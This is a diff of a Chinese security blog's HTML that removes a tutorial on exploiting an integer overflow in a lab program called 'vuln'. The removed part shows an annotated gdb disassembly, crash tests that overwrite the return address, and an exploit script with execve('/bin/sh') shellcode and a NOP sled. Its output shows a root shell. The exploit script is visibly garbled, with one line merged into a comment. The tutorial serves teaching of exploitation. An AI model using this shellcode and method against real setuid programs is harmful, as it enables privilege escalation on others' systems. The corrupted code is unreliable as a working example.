class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x080484b6</span> &lt;+<span class="number">24</span>&gt;: mov <span class="number">-0x1c</span>(%ebp),%ecx</div><div class="line"> <span class="number">0x080484b9</span> &lt;+<span class="number">27</span>&gt;: mov %edx,%edi</div><div class="line"> <span class="number">0x080484bb</span> &lt;+<span class="number">29</span>&gt;: repnz scas %es:(%edi),%al</div><div class="line"> <span class="number">0x080484bd</span> &lt;+<span class="number">31</span>&gt;: mov %ecx,%eax</div><div class="line"> <span class="number">0x080484bf</span> &lt;+<span class="number">33</span>&gt;: not %eax</div><div class="line"> <span class="number">0x080484c1</span> &lt;+<span class="number">35</span>&gt;: sub $<span class="number">0x1</span>,%eax                          <span class="comment">//String Length Calculation -- Ends here</span></div><div class="line"> <span class="number">0x080484c4</span> &lt;+<span class="number">38</span>&gt;: mov %al,<span class="number">-0x9</span>(%ebp)                     <span class="comment">//passwd_len = al</span></div><div class="line"> <span class="number">0x080484c7</span> &lt;+<span class="number">41</span>&gt;: cmpb $<span class="number">0x3</span>,<span class="number">-0x9</span>(%ebp)                   <span class="comment">//if(passwd_len &lt;= 4 )</span></div><div class="line"> <span class="number">0x080484cb</span> &lt;+<span class="number">45</span>&gt;: jbe <span class="number">0x8048500</span> &lt;validate_passwd+<span class="number">98</span>&gt;     <span class="comment">//jmp to 0x8048500</span></div><div class="line"> <span class="number">0x080484cd</span> &lt;+<span class="number">47</span>&gt;: cmpb $<span class="number">0x8</span>,<span class="number">-0x9</span>(%ebp)                   <span class="comment">//if(passwd_len &gt;=8)</span></div><div class="line"> <span class="number">0x080484d1</span> &lt;+<span class="number">51</span>&gt;: ja <span class="number">0x8048500</span> &lt;validate_passwd+<span class="number">98</span>&gt;      <span class="comment">//jmp to 0x8048500</span></div><div class="line"> <span class="number">0x080484d3</span> &lt;+<span class="number">53</span>&gt;: movl $<span class="number">0x8048660</span>,(%esp)                 <span class="comment">//else arg = format string "Valid Password"</span></div><div class="line"> <span class="number">0x080484da</span> &lt;+<span class="number">60</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;              <span class="comment">//call puts</span></div><div class="line"> <span class="number">0x080484df</span> &lt;+<span class="number">65</span>&gt;: mov <span class="number">0x804a020</span>,%eax                     <span class="comment">//eax = stdout </span></div><div class="line"> <span class="number">0x080484e4</span> &lt;+<span class="number">70</span>&gt;: mov %eax,(%esp)                        <span class="comment">//arg = stdout</span></div><div class="line"> <span class="number">0x080484e7</span> &lt;+<span class="number">73</span>&gt;: call <span class="number">0x8048380</span> &lt;fflush@plt&gt;            <span class="comment">//call fflush</span></div><div class="line"> <span class="number">0x080484ec</span> &lt;+<span class="number">78</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax                     <span class="comment">//eax = passwd</span></div><div class="line"> <span class="number">0x080484ef</span> &lt;+<span class="number">81</span>&gt;: mov %eax,<span class="number">0x4</span>(%esp)                     <span class="comment">//arg2 = passwd</span></div><div class="line"> <span class="number">0x080484f3</span> &lt;+<span class="number">85</span>&gt;: lea <span class="number">-0x14</span>(%ebp),%eax                   <span class="comment">//eax = passwd_buf</span></div><div class="line"> <span class="number">0x080484f6</span> &lt;+<span class="number">88</span>&gt;: mov %eax,(%esp)                        <span class="comment">//arg1 = passwd_buf</span></div><div class="line"> <span class="number">0x080484f9</span> &lt;+<span class="number">91</span>&gt;: call <span class="number">0x8048390</span> &lt;<span class="built_in">strcpy</span>@plt&gt;            <span class="comment">//call strcpy</span></div><div class="line"> <span class="number">0x080484fe</span> &lt;+<span class="number">96</span>&gt;: jmp <span class="number">0x8048519</span> &lt;validate_passwd+<span class="number">123</span>&gt;    <span class="comment">//jmp to 0x8048519</span></div><div class="line"> <span class="number">0x08048500</span> &lt;+<span class="number">98</span>&gt;: movl $<span class="number">0x804866f</span>,(%esp)                 <span class="comment">//arg = format string "Invalid Password"</span></div><div class="line"> <span class="number">0x08048507</span> &lt;+<span class="number">105</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">puts</span>@plt&gt;             <span class="comment">//call puts</span></div><div class="line"> <span class="number">0x0804850c</span> &lt;+<span class="number">110</span>&gt;: mov <span class="number">0x804a020</span>,%eax                    <span class="comment">//eax = stdout</span></div><div class="line"> <span class="number">0x08048511</span> &lt;+<span class="number">115</span>&gt;: mov %eax,(%esp)                       <span class="comment">//arg = stdout</span></div><div class="line"> <span class="number">0x08048514</span> &lt;+<span class="number">118</span>&gt;: call <span class="number">0x8048380</span> &lt;fflush@plt&gt;           <span class="comment">//fflush</span></div><div class="line"> <span class="number">0x08048519</span> &lt;+<span class="number">123</span>&gt;: lea <span class="number">-0x14</span>(%ebp),%eax                  <span class="comment">//eax = passwd_buf</span></div><div class="line"> <span class="number">0x0804851c</span> &lt;+<span class="number">126</span>&gt;: mov %eax,(%esp)                       <span class="comment">//arg = passwd_buf</span></div><div class="line"> <span class="number">0x0804851f</span> &lt;+<span class="number">129</span>&gt;: call <span class="number">0x8048494</span>                        <span class="comment">//call store_passwd_indb</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x08048524</span> &lt;+<span class="number">134</span>&gt;: add $<span class="number">0x34</span>,%esp                        <span class="comment">//unwind stack space</span></div><div class="line"> <span class="number">0x08048527</span> &lt;+<span class="number">137</span>&gt;: pop %edi                              <span class="comment">//restore edi</span></div><div class="line"> <span class="number">0x08048528</span> &lt;+<span class="number">138</span>&gt;: pop %ebp                              <span class="comment">//restore ebp</span></div><div class="line"> <span class="number">0x08048529</span> &lt;+<span class="number">139</span>&gt;: ret                                   <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u><em>堆栈布局：</em></u></p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/level1integer2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/level1integer2.png" width="450"></a><br>    <figcaption></figcaption><br></figure> 
-
-<p>刚才讲到，一个长度为261的密码会绕过边界检查，并且允许我们覆盖存储于栈内的返回地址。那么好，我们来通过发送一串A的方法进行测试。</p>
-<h3 id="0X03-利用整型溢出漏洞"><a href="#0X03-利用整型溢出漏洞" class="headerlink" title="0X03 利用整型溢出漏洞"></a>0X03 利用整型溢出漏洞</h3><p>测试第一步：这样做是否会覆盖返回地址？</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/iof/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) r sploitfun `python -c 'print "A"*261'`</div><div class="line">Starting program: /home/sploitfun/lsploits/iof/vuln sploitfun `python -c 'print "A"*261'`</div><div class="line">Valid Password</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>测试第二步：来自目标缓冲区的偏移量是什么？</p>
-<p>在这里我们来找找缓冲区‘passed_buf’中返回地址的偏移处于什么位置。之前我们已经反汇编并画出了validate_passwd()的堆栈布局，那么现在就试着找出代码的偏移位置信息吧！由堆栈布局可以看出，返回地址位于缓冲区‘passwd_buf’的偏移(0x18)处。(0x18)计算方式如下：</p>
-<pre><code>0X03 0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4
-</code></pre><p>其中：</p>
-<ul>
-<li>0xb 是 ‘passwd_buf’ 大小</li>
-<li>0x1 是 ‘passwd_len’ 大小</li>
-<li>0x4 是 对齐空间</li>
-<li>0x4 是 EDI</li>
-<li>0x4 是调用者的EBP</li>
-</ul>
-<p>这样一来，用户输入 “A” <em> 24 + “B” </em> 4 + “C” * 233，就能以一串“A”覆盖passwd_buf, passwd_len, 对齐空间和调用者的EBP，以“BBBB”覆盖返回地址，以一串C覆盖剩余空间。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/iof/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) r sploitfun `python -c 'print "A"*24 + "B"*4 + "C"*233'`</div><div class="line">Starting program: /home/sploitfun/lsploits/iof/vuln sploitfun `python -c 'print "A"*24 + "B"*4 + "C"*233'`</div><div class="line">Valid Password</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>上述输出结果表明攻击者已然获得返回地址的控制权限。存储于栈(0xbffff1fc)中的返回地址已被“BBBB”覆盖。掌握了以上信息，我们就可以写出能实现任意代码执行的漏洞利用代码了。</p>
-<p><u><em>漏洞利用代码：</em></u><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py </span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">arg1 = <span class="string">"sploitfun"</span></div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = <span class="number">0xbffff274</span></div><div class="line"></div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numunk + RA + NOP's + Shellcode</div><div class="line">arg2 = <span class="string">"A"</span> * <span class="number">24</span></div><div class="line">arg2 += conv(ret_addr);</div><div class="line">arg2 += <span class="string">"\x90"</span> * <span class="number">100</span></div><div class="line">arg2 += scode</div><div class="line">arg2 += <span class="string">"C"</span> * <span class="number">108</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, arg1, arg2])</div></pre></td></tr></table></figure></p>
-<p>执行上述漏洞利用程序可以获取root shell，如下所示</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Valid Password</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
-<p><u><em>参考文章：</em></u></p>
-<ol>
-<li><a href="http://phrack.org/issues/60/10.html" target="_blank" rel="external">phrack-integerflow</a></li>
-</ol>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161230/integerflow/" target="_blank" rel="external">Linux(X86)漏洞利用系列-整型溢出利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Overflow/">Overflow</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -1066,6 +1086,18 @@ $ echo $?
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170330/kernelmalware/">内核层恶意代码分析</a></h6>
+          <!--  <span>三月 30, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -1247,18 +1279,6 @@ $ echo $?
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170301/pvops/">Hook内核之PVOPS</a></h6>
-          <!--  <span>三月 1, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -1279,7 +1299,7 @@ $ echo $?
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.73px;">Conference</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.27px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.91px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.36px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.45px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 11.82px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.91px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.91px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.45px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 10.91px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.18px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.73px;">Conference</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.27px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.91px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.36px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.45px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 12.73px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.91px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.91px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.45px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.82px;">Rootkit</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.18px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
     </div>
   </div>
 
